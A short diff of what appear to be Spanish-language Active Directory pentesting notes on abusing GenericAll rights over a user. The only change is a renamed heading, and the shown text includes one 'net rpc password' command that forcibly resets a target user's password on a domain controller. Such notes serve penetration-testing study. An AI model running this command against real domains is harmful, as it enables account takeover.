@@ -2,9 +2,8 @@
 
 Tags: #AD #ACL #Linux #Pywhisker #Gettgtpkinit #Net 
 
-## GenerciAll sobre Usuario 
+## GenerciAll sobre Usuario (ChangePassword)
 
-### Forma 1 (ChangePassword)
 ```bash 
 Paso 1:
 ❯ net rpc password 'TargetUser' 'NewPass123!' -U domain.corp/user%'passwd' -S IP_DC
